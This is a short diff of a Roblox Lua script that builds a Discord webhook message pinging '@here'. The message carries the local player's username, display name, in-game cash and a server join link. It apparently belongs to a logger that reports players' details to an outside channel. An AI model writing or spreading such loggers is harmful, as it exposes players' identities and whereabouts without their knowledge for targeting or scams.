@@ -13,9 +13,9 @@ local data = {
    ["content"] = "@here",
    ["embeds"] = {
        {
-           ["author"] = {name = "Updated Web"},
+           ["author"] = {name = "1 Leg Korblox Updated Webhook"},
            ["title"] = "https://www.roblox.com/home?placeID=2788229376&gameID="..game.JobId,
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.."**\n Displayname:**"..game.Players.LocalPlayer.DisplayName.."** with **"..webhookcheck.."** Cash: **"..game.Players.LocalPlayer:WaitForChild("DataFolder"):WaitForChild("Currency").Value.."**",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
